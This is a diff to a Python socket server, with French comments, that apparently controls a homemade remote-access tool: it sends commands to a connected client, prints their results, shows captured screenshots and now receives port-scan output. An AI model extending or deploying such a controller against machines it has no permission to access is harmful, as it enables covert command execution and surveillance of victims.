@@ -1,6 +1,4 @@
 import socket
-import subprocess
-import os
 from PIL import Image
 
 ip_add = "127.0.0.1"
@@ -32,11 +30,13 @@ def send_command(conn):
             break
         elif command == "capture":
             receive_screen(conn)
+        elif command.startswith("scan"):
+            receive_scan(conn)
         else:
             result = conn.recv(4096).decode("utf-8", errors="replace") # Recoie le résultat
             print(result)  # Affichage du résultat côté serveur
         
-        
+# Fonction qui recoit le screenshot
 def receive_screen(conn):
     # Recoie la taille de l'image
     size = int.from_bytes(conn.recv(4), 'big')
@@ -51,6 +51,13 @@ def receive_screen(conn):
     img = Image.frombytes("RGB", (width, height), img_data) # Reconstruit l'image et l'affiche
     img.show()
 
+# Fonction qui recoit les résultats su scanner de port 
+def receive_scan(conn):
+    scan_result = conn.recv(4096)
+    if scan_result:
+        scan_result = scan_result.decode("utf-8", errors="replace")
+        print(scan_result)
+
 
 if __name__ == "__main__":
     try:
@@ -59,3 +66,8 @@ if __name__ == "__main__":
         accept_socket(s)
     except:
         print(f"cannot listen on port : {port}")
+
+
+
+
+   
